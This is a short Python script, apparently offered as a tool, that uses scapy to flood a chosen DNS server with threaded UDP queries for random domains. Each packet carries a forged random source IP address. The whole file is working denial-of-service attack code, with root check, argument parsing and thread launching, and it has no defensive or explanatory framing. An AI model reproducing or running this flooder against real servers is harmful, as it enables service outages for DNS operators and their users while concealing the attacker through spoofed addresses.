#!./env/bin/python3

from scapy.all import *
from time import sleep
from sys import exit as sysexit
import string
import random
import threading
from argparse import ArgumentParser

# check for root
if not os.geteuid() == 0:
    sysexit("\nOnly root can run this script\n")

# init option parser
parser = ArgumentParser(description='Simple DNS-Flooder')
parser.add_argument("-s", "--server", help='DNS-Server IP Address', required=True)
parser.add_argument("-t", "--threads", type=int, help='Threads to use', required=True)
args = parser.parse_args()

# perform dns query
def perform_query(dns, domain, sourceIP):
    packet = IP(src=sourceIP, dst=dns) / UDP() / DNS(rd=1, qd=DNSQR(qname=domain))
    send(packet)

# randomized Domain
def get_rand_domain():
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(6))

# randomized IP
def get_random_IP():
    genIP = ""
    for i in range(0, 4):
        part = str(random.randint(1,254))
        genIP += part + "."
    return genIP[:-1]

# flood
def flood(): 
    while True:
        global answ
        domainToUse = get_rand_domain()
        ipToUse = get_random_IP()
        try:
            answ = perform_query(args.server, f"{domainToUse}.com", ipToUse)
        except:
            domainToUse = get_rand_domain()

# start threads
def start_threads():
    threads = int(args.threads)
    for i in range(1,threads):
        t = threading.Thread(target=flood)
        t.start()

# start here
if __name__ == "__main__":
    print(f"Starting Flood of {args.server} with {args.threads} Threads in 3 seconds ...")
    sleep(3)
    start_threads()